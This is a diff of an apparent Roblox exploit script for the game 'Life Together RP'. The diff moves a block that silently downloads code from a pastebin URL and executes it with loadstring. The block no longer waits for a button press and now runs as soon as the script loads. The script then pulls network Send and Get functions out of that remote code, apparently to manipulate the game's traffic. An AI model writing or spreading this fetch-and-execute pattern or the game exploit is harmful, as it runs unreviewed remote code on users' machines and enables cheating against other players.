@@ -7,6 +7,17 @@ local InsertService = game:GetService("InsertService")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 
+---load network
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))()
+end)
+task.wait(1)
+
+getgenv().Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
+getgenv().Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
+
+
+
 
 -- Life Together RP Payload Formatter
 local function buildBatchPayload(data)
@@ -2060,13 +2071,7 @@ outfitData.WalkAnimation = getVal("WalkAnimation")
                 wearBtn.Text = "Loading Net..."
                 wearBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
                 -- Silently fetch and execute the game's network API so this script runs standalone
-                pcall(function()
-                    loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))()
-                end)
-                task.wait(1)
-                Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
-                Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
-            end
+             end
 
             if Send then
                 wearBtn.Text = "Applying..."
